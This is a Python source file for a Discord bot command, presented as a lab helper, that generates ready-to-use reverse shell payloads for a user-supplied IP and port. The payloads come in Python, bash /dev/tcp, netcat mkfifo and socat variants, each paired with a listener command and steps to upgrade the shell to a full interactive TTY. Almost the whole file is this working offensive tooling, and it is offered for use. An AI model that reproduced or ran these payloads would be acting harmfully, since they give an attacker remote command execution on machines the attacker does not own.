import os
import discord
from discord import app_commands
from discord.ext import commands

from cogs.utils.notification_msg import NotificationMsg

class PayloadGenerator(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="payload", description="Generate a reverse shell payload")
    @app_commands.describe(
        lhost="Your Listening IP (e.g. 1.1.1.x)",
        lport="Your Listening Port",
        shell_type="Type of shell (bash, python, nc, php)"
    )
    @app_commands.choices(shell_type=[
        app_commands.Choice(name="Python (Recommended)", value="python"),
        app_commands.Choice(name="Bash", value="bash"),
        app_commands.Choice(name="Netcat (Pipe)", value="nc"),
        app_commands.Choice(name="Socat (Full TTY)", value="socat")
    ])
    async def payload_generator(self, interaction: discord.Interaction, lhost: str, lport: int, shell_type: str = "python"):
        
        # Prevent interaction timeout
        await interaction.response.defer(ephemeral=True)

        # Generate the payload
        shells = {
            "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'""",
            "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
        }

        selected_payload = shells.get(shell_type, shells["python"])
        listener_cmd = (
            f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}"
            if shell_type == "socat"
            else f"nc -lvnp {lport}"
        )

        embed = NotificationMsg.info_msg(
            title=f"💀 Reverse Shell: {shell_type.upper()}",
            description="Follow the steps below to establish and upgrade to a fully interactive TTY shell."
        )
        
        embed.add_field(name="Target LHOST", value=f"`{lhost}`", inline=True)
        embed.add_field(name="Target LPORT", value=f"`{lport}`", inline=True)
        
        # Set up your listener
        embed.add_field(
            name="1. Start Listener (Attacker Node)", 
            value=f"```bash\n{listener_cmd}\n```",
            inline=False
        )

        # Set up payload
        embed.add_field(
            name="2. Set Payload (Target Node)", 
            value=f"```bash\n{selected_payload}\n```",
            inline=False
        )

        # Upgrade TTY (not needed for socat full TTY)
        if shell_type != "socat":
            embed.add_field(
                name="3. Upgrade to Interactive TTY",
                value=(
                    "**A. Spawn PTY (Choose one):**\n"
                    "- Python: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`\n"
                    "- Fallback (No Python): `/usr/bin/script -qc /bin/bash /dev/null`\n"
                    "**B. Background process:** `Ctrl + Z`\n"
                    "**C. Set raw terminal & foreground:**\n"
                    "```bash\nstty raw -echo; fg\n```\n"
                    "*(Press Enter 1-2 times to restore prompt)*\n"
                ),
                inline=False,
            )
        
        # Footer
        embed.set_footer(text="Cybersecurity Lab Helper | Keep it Ethical!")
        
        await interaction.followup.send(embed=embed)

async def setup(bot):
    await bot.add_cog(PayloadGenerator(bot))